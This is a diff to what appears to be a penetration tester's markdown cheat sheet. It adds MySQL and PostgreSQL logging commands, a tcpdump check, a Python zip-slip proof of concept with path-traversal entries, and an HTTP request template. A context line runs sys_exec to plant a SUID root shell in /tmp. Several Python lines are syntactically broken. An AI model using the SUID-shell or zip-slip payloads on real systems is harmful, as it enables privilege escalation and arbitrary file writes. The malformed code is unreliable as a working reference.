@@ -105,7 +105,72 @@ select * from mysql.func where name='sys_exec' \G
 select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
 ```
 
+Enable logs:
+```
+sudo sed -i "s/#general_log/general_log/g" /etc/mysql/my.cnf 
+sudo sed -i "s/#general_log/general_log/g" /etc/mysql/mysql.conf.d/mysqld.cnf
+sudo sed -i "s/#general_log/general_log/g" /etc/mysql/conf.d/mysqld.cnf
+```
+
+Restart
+```
+sudo systemctl restart mysql
+```
+
+Tail logs
+```
+sudo tail –f /var/log/mysql/mysql.log
+```
+## postgresql
+
+Enable logs:
+```bash
+echo "log_statement = 'all'" >> postgresql.conf  #none, ddl, mod, all. written to pgsql_log
+```
+
 ## Ping check 
 ```
 tcpdump -i tun0 icmp 
+```
+
+## Python Snippets 
+
+Create ZIP file"
+```python
+#!/usr/bin/python
+import zipfile
+from cStringIO import StringIO
+
+def build_zip(): f = StringIO()
+  z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
+  z.writestr('poc/poc.txt', 'poc')
+  z.writestr('../../../../../../../../../../tmp/poc.txt', 'poc')
+  z.close()
+  zip = open('poc.zip','wb')
+  zip.write(f.getvalue())
+  zip.close()
+
+build_zip()
+```
+
+HTTP Request
+```python
+import sys
+import requests
+import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def main():
+    if len(sys.argv) != 2:
+        print "[+] Usage   : %s <target>" % sys.argv[0] 
+        print "[+] Example : %s target" % sys.argv[0]
+        sys.exit(1)
+
+    target = sys.argv[1]
+    param = "example"
+    rsp = requests.get('https://%s:8080/example' % target, params='test=%s' % param, verify=False)
+    print rsp.text
+    print rsp.headers
+
+if __name__ == '__main__': 
+    main()
 ```
